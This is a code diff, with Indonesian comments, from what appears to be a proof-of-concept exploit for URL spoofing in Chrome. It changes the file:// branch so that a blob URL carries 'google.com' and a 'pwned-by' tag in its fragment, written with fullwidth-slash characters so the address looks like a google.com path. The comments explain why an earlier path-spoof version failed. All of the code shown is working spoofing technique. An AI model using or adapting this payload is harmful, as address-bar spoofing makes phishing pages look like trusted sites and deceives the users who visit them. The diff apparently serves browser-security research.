@@ -47,13 +47,16 @@
         return u.substring(u.lastIndexOf('/') + 1);
       }
 
-      // ---- JALUR file:// : prefix terpendek "blob:null/" + path google.com ----
+      // ---- JALUR file:// : canonical blob:null/<uuid> + fragment ----
+      // Penting: di file:// Chrome match blob URL EXACT-STRING (bukan by UUID),
+      // jadi path-spoof ("blob:null/google.com/...") GAGAL (ERR_FILE_NOT_FOUND).
+      // google.com + pwned ditaruh di fragment saja.
       if (location.protocol === 'file:' || location.origin === 'null') {
         var uf = makeUrl();
-        var dispf = 'blob:null/google.com/pwned-by-abhirdd/' + uuidOf(uf);
-        log('[main] mode file:// -> DIRECT (path spoof)');
-        log('[main] target: ' + dispf + FRAG + dispf);
-        location.replace(dispf + FRAG + dispf);
+        var fragf = '#%EF%BC%8Fgoogle.com%EF%BC%8Fpwned-by-abhirdd%EF%BC%8F' + uf;
+        log('[main] mode file:// -> canonical blob:null + fragment');
+        log('[main] target: ' + uf + fragf);
+        location.replace(uf + fragf);
         return;
       }
 
